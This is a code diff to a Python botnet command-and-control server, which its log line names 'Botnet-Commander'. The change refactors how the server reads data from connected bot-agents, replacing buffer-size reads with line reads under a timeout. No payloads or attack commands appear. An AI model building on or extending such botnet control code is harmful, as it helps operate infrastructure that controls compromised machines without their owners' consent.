@@ -19,22 +19,22 @@ def load_conf():
         log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
         log_dir = config_parser.get("CORE", "LOG_DIR")
         log_name = config_parser.get("CORE", "LOG_NAME")
-        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
+        read_tout = int(config_parser.get("CORE", "READ_TOUT"))
         offline_tout = int(config_parser.get("CORE", "OFFLINE_TOUT"))
     except Exception as err:
         print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
               "exception occurred: {}".format(err))
         exit(5)
-    return host, port, log_level, log_dir, log_name, conn_buff, offline_tout
+    return host, port, log_level, log_dir, log_name, read_tout, offline_tout
 
 
 class BotCommander:
-    def __init__(self, host, port, conn_rcv, offline_tout):
+    def __init__(self, host, port, read_tout, offline_tout):
         self.uuids = {}
         self.host = host
         self.port = port
-        self.conn_rcv = conn_rcv
         self.offline_tout = offline_tout
+        self.read_tout = read_tout
         self.sock = socket(AF_INET, SOCK_STREAM)
         loop = asyncio.new_event_loop()
         loop.create_task(self.__process_user_input())
@@ -160,7 +160,7 @@ class BotCommander:
         pass
 
     async def __read_buffer(self, reader, addr):
-        buffer = await self.__read_initial(reader, addr)
+        buffer = await self.__read_line(reader, addr)
         if not buffer:
             return False
         logger.core.debug(f"Incoming input stream {buffer} from bot-agent {addr}")
@@ -172,7 +172,7 @@ class BotCommander:
                 data_list.append(line)
             else:
                 logger.core.debug(f"Received {data_list} from bot-agent {addr} so far, waiting for more data")
-                more_data = await reader.read(self.conn_rcv)
+                more_data = await self.__read_line(reader, addr)
                 logger.core.debug(f"Received more data {more_data} from bot-agent {addr}")
                 if not more_data:
                     buffering = False
@@ -180,9 +180,9 @@ class BotCommander:
                     buffer += more_data
         return data_list
 
-    async def __read_initial(self, reader, addr):
+    async def __read_line(self, reader, addr):
         try:
-            buffer = await asyncio.wait_for(reader.read(self.conn_rcv), timeout=self.offline_tout)
+            buffer = await asyncio.wait_for(reader.readline(), timeout=self.offline_tout)
         except TimeoutError:
             logger.core.error(f"Timeout exceeded for bot-agent {addr}, no input stream received in the"
                               f"last 200 seconds, setting bot-agent to offline, closing connection")
@@ -350,7 +350,7 @@ class BotCommander:
 
 
 if __name__ == "__main__":
-    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF, OFFLINE_TOUT = load_conf()
+    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, READ_TOUT, OFFLINE_TOUT = load_conf()
     logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
-    srv = BotCommander(HOST, PORT, CONN_BUFF, OFFLINE_TOUT)
+    srv = BotCommander(HOST, PORT, READ_TOUT, OFFLINE_TOUT)
     logger.core.info("Botnet-Commander exited")
